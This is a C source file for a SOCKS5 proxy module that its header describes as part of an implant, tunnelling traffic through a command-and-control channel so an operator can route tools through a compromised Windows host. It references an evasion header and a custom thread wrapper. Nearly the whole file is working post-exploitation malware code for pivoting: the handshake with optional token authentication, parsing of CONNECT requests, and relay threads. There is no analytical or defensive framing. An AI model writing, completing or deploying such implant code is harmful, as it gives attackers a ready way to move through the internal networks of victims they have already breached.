/**
 * socks.c - SOCKS5 Proxy Server
 *
 * Implements a SOCKS5 proxy within the implant, tunneling traffic
 * through the C2 channel. Enables the operator to route tools
 * through the compromised host.
 *
 * Supports: CONNECT, BIND (limited), UDP ASSOCIATE (planned)
 * Auth: No-auth (operator controls access via C2 channel)
 */

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "../../include/pivot.h"
#include "../../include/evasion.h"

#pragma comment(lib, "ws2_32.lib")

#define SOCKS_MAX_CONNECTIONS 64
#define SOCKS_BUFFER_SIZE     65536

typedef struct _SOCKS_CONN {
    SOCKET client_socket;
    SOCKET remote_socket;
    BOOL   active;
    DWORD  id;
    char   target_host[256];
    WORD   target_port;
} SOCKS_CONN;

typedef struct _SOCKS_SERVER {
    SOCKET listen_socket;
    WORD   listen_port;
    BOOL   running;
    SOCKS_CONN connections[SOCKS_MAX_CONNECTIONS];
    DWORD  next_id;
    HANDLE thread;
} SOCKS_SERVER;

static SOCKS_SERVER g_socks = {0};

// SOCKS5 protocol constants
#define SOCKS5_VERSION    0x05
#define SOCKS5_AUTH_NONE      0x00
#define SOCKS5_AUTH_USERPASS  0x02
#define SOCKS5_CMD_CONNECT 0x01
#define SOCKS5_CMD_BIND    0x02
#define SOCKS5_ATYP_IPV4   0x01
#define SOCKS5_ATYP_DOMAIN 0x03
#define SOCKS5_ATYP_IPV6   0x04
#define SOCKS5_REP_SUCCESS 0x00
#define SOCKS5_REP_FAILURE 0x01
#define SOCKS5_REP_DENIED  0x02
#define SOCKS5_REP_NETUNREACH 0x03
#define SOCKS5_REP_HOSTUNREACH 0x04
#define SOCKS5_REP_CONNREFUSED 0x05

static BOOL socks5_handshake(SOCKET client) {
    BYTE buf[256];
    int recv_len = recv(client, (char*)buf, sizeof(buf), 0);
    if (recv_len < 3) return FALSE;

    if (buf[0] != SOCKS5_VERSION) return FALSE;

    int nmethods = (int)buf[1];
    if (recv_len < 2 + nmethods) return FALSE;

#ifdef SOCKS_AUTH_TOKEN
    BOOL offers_userpass = FALSE;
    for (int i = 0; i < nmethods; i++) {
        if (buf[2 + i] == SOCKS5_AUTH_USERPASS)
            offers_userpass = TRUE;
    }
    (void)offers_userpass;

    BYTE response[2];
    response[0] = SOCKS5_VERSION;
    response[1] = offers_userpass ? SOCKS5_AUTH_USERPASS : SOCKS5_AUTH_NONE;
    if (send(client, (char*)response, 2, 0) != 2) return FALSE;

    if (response[1] == SOCKS5_AUTH_USERPASS) {
        recv_len = recv(client, (char*)buf, sizeof(buf), 0);
        if (recv_len < 3 || buf[0] != 0x01) return FALSE;

        int ulen = (int)buf[1];
        if (recv_len < 3 + ulen + 1) return FALSE;
        int plen = (int)buf[2 + ulen];
        if (recv_len < 3 + ulen + 1 + plen) return FALSE;

        char passwd[256] = {0};
        if (plen >= (int)sizeof(passwd)) return FALSE;
        CopyMemory(passwd, &buf[3 + ulen], plen);
        passwd[plen] = '\0';

        BYTE auth_resp[2] = { 0x01, 0x00 };
        if (lstrcmpA(passwd, SOCKS_AUTH_TOKEN) != 0)
            auth_resp[1] = 0x01;
        if (send(client, (char*)auth_resp, 2, 0) != 2) return FALSE;
        if (auth_resp[1] != 0x00) return FALSE;
    }
    return TRUE;
#else
    BYTE response[2] = { SOCKS5_VERSION, SOCKS5_AUTH_NONE };
    send(client, (char*)response, 2, 0);
    return TRUE;
#endif
}

static BOOL socks5_connect(SOCKET client, SOCKS_CONN* conn) {
    BYTE buf[512];
    int recv_len = recv(client, (char*)buf, sizeof(buf), 0);
    if (recv_len < 7) return FALSE;

    // Parse request: VER CMD RSV ATYP DST.ADDR DST.PORT
    if (buf[0] != SOCKS5_VERSION) return FALSE;
    if (buf[1] != SOCKS5_CMD_CONNECT) {
        // Only CONNECT supported for now
        BYTE fail[] = { SOCKS5_VERSION, SOCKS5_REP_FAILURE, 0x00, SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0 };
        send(client, (char*)fail, sizeof(fail), 0);
        return FALSE;
    }

    // Parse target address
    char target_host[256] = {0};
    WORD target_port = 0;
    int addr_offset = 4;

    switch (buf[3]) {
    case SOCKS5_ATYP_IPV4: {
        struct in_addr addr;
        memcpy(&addr, &buf[addr_offset], 4);
        inet_ntop(AF_INET, &addr, target_host, sizeof(target_host));
        target_port = ntohs(*(WORD*)&buf[addr_offset + 4]);
        break;
    }
    case SOCKS5_ATYP_DOMAIN: {
        if (recv_len < addr_offset + 1) return FALSE;
        int domain_len = buf[addr_offset];
        if (domain_len <= 0 || domain_len > 255) return FALSE;
        if (recv_len < addr_offset + 1 + domain_len + 2) return FALSE;
        if ((DWORD)domain_len >= sizeof(target_host)) return FALSE;
        CopyMemory(target_host, &buf[addr_offset + 1], domain_len);
        target_host[domain_len] = 0;
        target_port = ntohs(*(WORD*)&buf[addr_offset + 1 + domain_len]);
        break;
    }
    case SOCKS5_ATYP_IPV6: {
        // IPv6 support
        char ipv6[INET6_ADDRSTRLEN];
        inet_ntop(AF_INET6, &buf[addr_offset], ipv6, sizeof(ipv6));
        strncpy(target_host, ipv6, sizeof(target_host) - 1);
        target_port = ntohs(*(WORD*)&buf[addr_offset + 16]);
        break;
    }
    default:
        return FALSE;
    }

    // Connect to target
    struct addrinfo hints = {0}, *result = NULL;
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[8];
    _snprintf(port_str, sizeof(port_str), "%d", target_port);

    if (getaddrinfo(target_host, port_str, &hints, &result) != 0) {
        BYTE fail[] = { SOCKS5_VERSION, SOCKS5_REP_HOSTUNREACH, 0x00, SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0 };
        send(client, (char*)fail, sizeof(fail), 0);
        return FALSE;
    }

    SOCKET remote = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (remote == INVALID_SOCKET) {
        freeaddrinfo(result);
        return FALSE;
    }

    if (connect(remote, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        BYTE fail[] = { SOCKS5_VERSION, SOCKS5_REP_CONNREFUSED, 0x00, SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0 };
        send(client, (char*)fail, sizeof(fail), 0);
        closesocket(remote);
        freeaddrinfo(result);
        return FALSE;
    }

    freeaddrinfo(result);

    // Send success response
    BYTE success[] = { SOCKS5_VERSION, SOCKS5_REP_SUCCESS, 0x00, SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0 };
    send(client, (char*)success, sizeof(success), 0);

    // Store connection
    conn->remote_socket = remote;
    strncpy(conn->target_host, target_host, sizeof(conn->target_host) - 1);
    conn->target_port = target_port;

    return TRUE;
}

static DWORD WINAPI socks_relay_thread(LPVOID param) {
    SOCKS_CONN* conn = (SOCKS_CONN*)param;
    BYTE buf[SOCKS_BUFFER_SIZE];
    fd_set readfds;

    while (conn->active) {
        FD_ZERO(&readfds);
        FD_SET(conn->client_socket, &readfds);
        FD_SET(conn->remote_socket, &readfds);

        struct timeval tv = { 1, 0 }; // 1 second timeout
        SOCKET max_fd = max(conn->client_socket, conn->remote_socket) + 1;

        int ready = select((int)max_fd, &readfds, NULL, NULL, &tv);
        if (ready <= 0) continue;

        // Client -> Remote
        if (FD_ISSET(conn->client_socket, &readfds)) {
            int n = recv(conn->client_socket, (char*)buf, sizeof(buf), 0);
            if (n <= 0) break;
            send(conn->remote_socket, (char*)buf, n, 0);
        }

        // Remote -> Client
        if (FD_ISSET(conn->remote_socket, &readfds)) {
            int n = recv(conn->remote_socket, (char*)buf, sizeof(buf), 0);
            if (n <= 0) break;
            send(conn->client_socket, (char*)buf, n, 0);
        }
    }

    // Cleanup
    closesocket(conn->client_socket);
    closesocket(conn->remote_socket);
    conn->active = FALSE;
    return 0;
}

static DWORD WINAPI socks_listen_thread(LPVOID param) {
    while (g_socks.running) {
        SOCKET client = accept(g_socks.listen_socket, NULL, NULL);
        if (client == INVALID_SOCKET) {
            if (!g_socks.running) break;
            continue;
        }

        // Find free connection slot
        SOCKS_CONN* conn = NULL;
        for (int i = 0; i < SOCKS_MAX_CONNECTIONS; i++) {
            if (!g_socks.connections[i].active) {
                conn = &g_socks.connections[i];
                break;
            }
        }

        if (!conn) {
            closesocket(client);
            continue;
        }

        conn->client_socket = client;
        conn->active = TRUE;
        conn->id = g_socks.next_id++;

        // SOCKS5 handshake
        if (!socks5_handshake(client)) {
            closesocket(client);
            conn->active = FALSE;
            continue;
        }

        // Process CONNECT request
        if (!socks5_connect(client, conn)) {
            closesocket(client);
            conn->active = FALSE;
            continue;
        }

        // Start relay thread
        jager_create_thread(NULL, 0, socks_relay_thread, conn, 0, NULL);
    }
    return 0;
}

// --- Public API ---

BOOL socks_start(WORD port) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    g_socks.listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_socks.listen_socket == INVALID_SOCKET) return FALSE;

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); // Only listen on localhost
    addr.sin_port = htons(port);

    if (bind(g_socks.listen_socket, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(g_socks.listen_socket);
        return FALSE;
    }

    if (listen(g_socks.listen_socket, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(g_socks.listen_socket);
        return FALSE;
    }

    g_socks.listen_port = port;
    g_socks.running = TRUE;
    g_socks.next_id = 1;

    g_socks.thread = jager_create_thread(NULL, 0, socks_listen_thread, NULL, 0, NULL);
    return g_socks.thread != NULL;
}

BOOL socks_stop(void) {
    g_socks.running = FALSE;
    closesocket(g_socks.listen_socket);

    // Close all active connections
    for (int i = 0; i < SOCKS_MAX_CONNECTIONS; i++) {
        if (g_socks.connections[i].active) {
            g_socks.connections[i].active = FALSE;
            closesocket(g_socks.connections[i].client_socket);
            closesocket(g_socks.connections[i].remote_socket);
        }
    }

    if (g_socks.thread) {
        WaitForSingleObject(g_socks.thread, 5000);
        CloseHandle(g_socks.thread);
    }

    return TRUE;
}

int socks_get_active_count(void) {
    int count = 0;
    for (int i = 0; i < SOCKS_MAX_CONNECTIONS; i++) {
        if (g_socks.connections[i].active) count++;
    }
    return count;
}

WORD socks_get_port(void) {
    return g_socks.listen_port;
}
